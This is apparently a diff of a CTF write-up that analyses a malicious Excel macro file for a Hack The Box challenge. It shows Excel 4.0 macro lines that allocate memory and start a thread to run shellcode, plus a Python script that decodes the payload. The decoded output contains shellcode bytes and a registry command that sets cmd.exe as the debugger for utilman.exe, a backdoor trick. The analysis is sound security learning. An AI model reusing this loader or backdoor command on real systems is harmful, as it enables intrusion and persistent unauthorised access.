@@ -1,6 +1,6 @@
 First I unzipped the xlsm document and picked it apart in a text editor, looking for interesting stuff in the xml outputs. Found:
 
-`
+```
 <mc:Choice Requires="x15"
 <x15ac:absPath url="C:\Users\wild\Documents\HTB_Challenges\CA-CTF-2022\free_services\local\" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac"/
 </mc:Choice
@@ -9,15 +9,15 @@ First I unzipped the xlsm document and picked it apart in a text editor, looking
 <bookViews
 <workbookView xWindow="-120" yWindow="-120" windowWidth="29040" windowHeight="15840" activeTab="1" xr2:uid="{4430E66F-0907-41B8-9086-199DA6C489AC}"/
 [...]
-`
+```
 in sharedStrings:
-`
+```
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="2" uniqueCount="2"><si><t>=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)</t></si><si><t>HALT()</t></si></sst>
-`
+```
 There is also a Macro workbook:
 
 Tried to understand what each line is doing here, took a couple notes:
-`
+```
 A1=select(E1:G258) - Selects the cells with data
 A2=call("Kernel32","VirtualAlloc","JJJJJ",0,386,4096,64) - Allocates an amount of bytes
 A3=set.value(C1, 0) - Sets C1 to 0 initially
@@ -30,7 +30,7 @@ A9=next()
 A10=CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C6, 0, 0, 0)  R2C6 is 2 rows down, 6 columns right..
 A11=workbook.activate("Sheet1")
 HALT()
-`
+```
 Searched around what this might be doing, so I can figure out the params to CreateThread, etc.  
 
 
@@ -49,8 +49,8 @@ Then I felt comfortable enough to break it down line by line and write some quic
 
 I saved out the cells E1:G258 as a CSV file in LibreCalc, called it mac.csv.
 
-mac.py
-`
+## mac.py
+```
 import csv
 
 def readcsv(filename):
@@ -92,13 +92,14 @@ for x in range(0,772,2):
 
 for b in bytes:
  print(b,end='')
-`
+```
 
 Ran it, looks good!! Output:
 
-`
+```
 Reading file mac.csv:
-üè` å1ÀdP0R
+üè å1ÀdP0R
 ²Ph1oÿÕ»ðµ¢Vh¦½ûàu»GrojSÿÕREG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f;echo "HTB{1s_th1s_g4l4xy_l0st_1n_t1m3??!}"
-`
+```
 
+This one took maybe a couple hours of reading up on this stuff and watching the Derbycon 2018 talk by Stan Hegt, Pieter Ceelen - the 'MS Office Magic Show' - really good stuff!!
